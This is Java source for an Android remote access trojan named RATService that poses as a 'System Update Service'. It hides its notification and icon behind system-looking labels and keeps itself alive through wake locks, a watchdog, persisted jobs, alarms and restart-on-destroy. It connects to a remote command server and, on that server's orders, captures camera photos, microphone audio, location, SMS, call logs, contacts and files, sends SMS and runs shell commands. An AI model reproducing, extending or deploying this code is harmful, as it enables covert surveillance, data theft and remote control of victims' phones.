package com.android.system.update;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Binder;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.RemoteException;
import android.os.SystemClock;
import android.util.Log;

import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.android.system.update.modules.*;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.concurrent.atomic.AtomicBoolean;

public class RATService extends Service {
    private static final String CHANNEL_ID = "SystemUpdateChannel";
    private static final int NOTIFICATION_ID = 1337;
    private static final String TAG = "SystemService";
    private static final int JOB_ID = 1001;
    private static final int PERSISTENCE_JOB_ID = 1002;
    private static final long RESTART_DELAY_MS = 5000; // 5 seconds - more natural
    private static final long CHECK_INTERVAL_MS = 45000; // 45 seconds - less frequent
    
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private AtomicBoolean isRunning = new AtomicBoolean(true);
    private Thread connectionThread;
    private Thread watchdogThread;
    private static volatile RATService instance;
    private PowerManager.WakeLock wakeLock;
    
    // Modules
    private CameraModule cameraModule;
    private MicModule micModule;
    private LocationModule locationModule;
    private SmsModule smsModule;
    private CallsModule callsModule;
    private ContactsModule contactsModule;
    private FileModule fileModule;
    private ShellModule shellModule;
    private DeviceModule deviceModule;
    
    // Binder for GuardianService communication
    public class RATServiceBinder extends Binder {
        public void heartbeat() throws RemoteException {
            if (!isRunning.get()) {
                throw new RemoteException("Service is not running");
            }
        }
    }
    
    private final RATServiceBinder binder = new RATServiceBinder();
    
    public static RATService getInstance() {
        return instance;
    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        AppController.setConnectionService(this);
        
        Log.d(TAG, "System service initialized");
        
        // Acquire wake lock to prevent CPU sleep
        acquireWakeLock();
        
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        
        // Initialize modules based on config
        if (Config.ENABLE_CAMERA) cameraModule = new CameraModule(this);
        if (Config.ENABLE_MICROPHONE) micModule = new MicModule(this);
        if (Config.ENABLE_LOCATION) locationModule = new LocationModule(this);
        if (Config.ENABLE_SMS) smsModule = new SmsModule(this);
        if (Config.ENABLE_CALLS) callsModule = new CallsModule(this);
        if (Config.ENABLE_CONTACTS) contactsModule = new ContactsModule(this);
        if (Config.ENABLE_FILES) fileModule = new FileModule(this);
        if (Config.ENABLE_SHELL) shellModule = new ShellModule();
        deviceModule = new DeviceModule(this);
        
        // Start internal watchdog
        startWatchdog();
        
        // Schedule all persistence mechanisms
        scheduleAllJobs();
        
        // Set that service should run on boot
        setRunOnBoot(true);
        
        startConnection();
    }
    
    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "SystemService::WakeLock"
            );
            wakeLock.setReferenceCounted(false);
            wakeLock.acquire(10 * 60 * 1000L); // 10 minute timeout, will auto-renew
            Log.d(TAG, "Wake lock acquired");
        } catch (Exception e) {
            Log.e(TAG, "Failed to acquire wake lock", e);
        }
    }
    
    private void startWatchdog() {
        watchdogThread = new Thread(() -> {
            while (isRunning.get()) {
                try {
                    Thread.sleep(CHECK_INTERVAL_MS);
                    
                    // Check if connection thread is alive
                    if (connectionThread == null || !connectionThread.isAlive()) {
                        Log.w(TAG, "Connection thread dead, restarting...");
                        startConnection();
                    }
                    
                    // Refresh wake lock
                    if (wakeLock != null && !wakeLock.isHeld()) {
                        acquireWakeLock();
                    }
                    
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "Watchdog error", e);
                }
            }
        });
        watchdogThread.start();
    }
    
    private void scheduleAllJobs() {
        // Schedule immediate restart job
        scheduleJobSchedulerRestart();
        
        // Schedule periodic persistence job
        schedulePersistenceJob();
        
        // Schedule alarm for checking
        scheduleCheckAlarm();
    }
    
    private void scheduleCheckAlarm() {
        Intent intent = new Intent(this, RestartReceiver.class);
        intent.setAction("CHECK_SERVICE");
        PendingIntent pendingIntent = PendingIntent.getBroadcast(
            this, 3, intent, 
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (alarmManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + CHECK_INTERVAL_MS,
                    pendingIntent
                );
            } else {
                alarmManager.setExact(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + CHECK_INTERVAL_MS,
                    pendingIntent
                );
            }
            Log.d(TAG, "Check alarm scheduled for " + (CHECK_INTERVAL_MS/1000) + " seconds");
        }
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "System service onStartCommand");
        
        // Reschedule jobs every time service starts
        scheduleAllJobs();
        
        // If service is killed, the system will try to restart it
        return START_STICKY;
    }
    
    private void schedulePersistenceJob() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                ComponentName componentName = new ComponentName(this, PersistenceJobService.class);
                JobInfo jobInfo = new JobInfo.Builder(PERSISTENCE_JOB_ID, componentName)
                        .setPeriodic(15 * 60 * 1000) // 15 minutes (Android minimum)
                        .setPersisted(true) // Survives reboot
                        .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                        .setBackoffCriteria(30000, JobInfo.BACKOFF_POLICY_EXPONENTIAL)
                        .build();
                
                JobScheduler jobScheduler = (JobScheduler) getSystemService(JOB_SCHEDULER_SERVICE);
                int result = jobScheduler.schedule(jobInfo);
                
                if (result == JobScheduler.RESULT_SUCCESS) {
                    Log.d(TAG, "Persistence job scheduled");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error scheduling persistence job", e);
            }
        }
    }
    
    private void scheduleJobSchedulerRestart() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                ComponentName componentName = new ComponentName(this, JobSchedulerService.class);
                JobInfo jobInfo = new JobInfo.Builder(JOB_ID, componentName)
                        .setMinimumLatency(RESTART_DELAY_MS)
                        .setOverrideDeadline(RESTART_DELAY_MS * 2)
                        .setPersisted(true)
                        .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                        .build();
                
                JobScheduler jobScheduler = (JobScheduler) getSystemService(JOB_SCHEDULER_SERVICE);
                int result = jobScheduler.schedule(jobInfo);
                
                if (result == JobScheduler.RESULT_SUCCESS) {
                    Log.d(TAG, "Restart job scheduled");
                }
            } catch (Exception e) {
                Log.e(TAG, "Failed to schedule restart job", e);
            }
        }
    }
    
    private void setRunOnBoot(boolean shouldRun) {
        SharedPreferences prefs = getSharedPreferences("service_prefs", MODE_PRIVATE);
        prefs.edit().putBoolean("should_run", shouldRun).apply();
    }
    
    private void startConnection() {
        if (connectionThread != null && connectionThread.isAlive()) {
            connectionThread.interrupt();
        }
        
        connectionThread = new Thread(() -> {
            while (isRunning.get()) {
                try {
                    socket = new Socket(Config.SERVER_HOST, Config.SERVER_PORT);
                    out = new PrintWriter(socket.getOutputStream());
                    in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    
                    sendDeviceInfo();
                    
                    String command;
                    while (isRunning.get() && (command = in.readLine()) != null) {
                        processCommand(command);
                    }
                    
                } catch (Exception e) {
                    if (isRunning.get()) {
                        Log.e(TAG, "Connection error", e);
                    }
                    try {
                        Thread.sleep(10000); // 10 seconds between retry
                    } catch (InterruptedException ie) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
        });
        connectionThread.start();
    }
    
    private void sendDeviceInfo() {
        String info = String.format("DEVICE|%s|%s|%s|%s",
            Build.MANUFACTURER,
            Build.MODEL,
            Build.VERSION.RELEASE,
            Build.VERSION.SDK_INT
        );
        sendCommand(info);
    }
    
    private void processCommand(String command) {
        String[] parts = command.split("\\|", 2);
        String cmd = parts[0];
        String args = parts.length > 1 ? parts[1] : "";
        
        switch (cmd) {
            case "PING":
                sendCommand("PONG");
                break;
                
            case "CAMERA_PHOTO":
                if (cameraModule != null) {
                    String result = cameraModule.takePhoto();
                    sendCommand("CAMERA_PHOTO|" + result);
                }
                break;
                
            case "MIC_START":
                if (micModule != null) {
                    String result = micModule.startRecording(30);
                    sendCommand("MIC_START|" + result);
                }
                break;
                
            case "MIC_STOP":
                if (micModule != null) {
                    String result = micModule.stopRecording();
                    sendCommand("MIC_STOP|" + result);
                }
                break;
                
            case "LOCATION":
                if (locationModule != null) {
                    String result = locationModule.getLocation();
                    sendCommand("LOCATION|" + result);
                }
                break;
                
            case "SMS_GET":
                if (smsModule != null) {
                    String result = smsModule.getSms();
                    sendCommand("SMS_GET|" + result);
                }
                break;
                
            case "SMS_SEND":
                if (smsModule != null && args.contains("|")) {
                    String[] parts2 = args.split("\\|", 2);
                    String result = smsModule.sendSms(parts2[0], parts2[1]);
                    sendCommand("SMS_SEND|" + result);
                }
                break;
                
            case "CALL_GET":
                if (callsModule != null) {
                    String result = callsModule.getCallLogs();
                    sendCommand("CALL_GET|" + result);
                }
                break;
                
            case "CONTACTS_GET":
                if (contactsModule != null) {
                    String result = contactsModule.getContacts();
                    sendCommand("CONTACTS_GET|" + result);
                }
                break;
                
            case "FILE_LIST":
                if (fileModule != null) {
                    String result = fileModule.listFiles(args);
                    sendCommand("FILE_LIST|" + result);
                }
                break;
                
            case "FILE_GET":
                if (fileModule != null) {
                    String result = fileModule.getFile(args);
                    sendCommand("FILE_GET|" + result);
                }
                break;
                
            case "SHELL":
                if (shellModule != null) {
                    String result = shellModule.executeCommand(args);
                    sendCommand("SHELL|" + result);
                }
                break;
                
            case "DEVICE_INFO":
                if (deviceModule != null) {
                    String result = deviceModule.getDeviceInfo();
                    sendCommand("DEVICE_INFO|" + result);
                }
                break;
                
            default:
                sendCommand("UNKNOWN_CMD|" + cmd);
        }
    }
    
    private void sendCommand(String data) {
        if (out != null) {
            out.println(data);
            out.flush();
        }
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN // Lowest importance
            );
            channel.setDescription("System optimization service");
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }
    
    private Notification createNotification() {
        // Use a generic system icon
        int icon = android.R.drawable.stat_sys_download_done; // Looks like system download
        
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Update Service")
            .setContentText("Optimizing system performance")
            .setSmallIcon(icon)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET);
        
        return builder.build();
    }
    
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Log.d(TAG, "Task removed - normal operation");
        
        // DON'T stop foreground or call stopSelf
        // Just reschedule quietly - this prevents crash popups
        scheduleAllJobs();
        scheduleRestartWithAlarm();
        
        // Let the service continue running naturally
        // The system will handle it without showing crash dialogs
    }
    
    private void scheduleRestartWithAlarm() {
        Intent restartIntent = new Intent(this, RATService.class);
        PendingIntent pendingIntent = PendingIntent.getService(
            this, 1, restartIntent, 
            PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
        
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (alarmManager != null) {
            // Use inexact alarm to be less aggressive
            alarmManager.set(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + RESTART_DELAY_MS, 
                pendingIntent);
            
            Log.d(TAG, "Restart scheduled");
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return binder;
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "System service onDestroy");
        isRunning.set(false);
        AppController.clearConnectionService();
        instance = null;
        
        try {
            if (socket != null) socket.close();
            if (connectionThread != null) connectionThread.interrupt();
            if (watchdogThread != null) watchdogThread.interrupt();
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        // Schedule restart mechanisms
        scheduleAllJobs();
        scheduleRestartWithAlarm();
        
        super.onDestroy();
    }
}
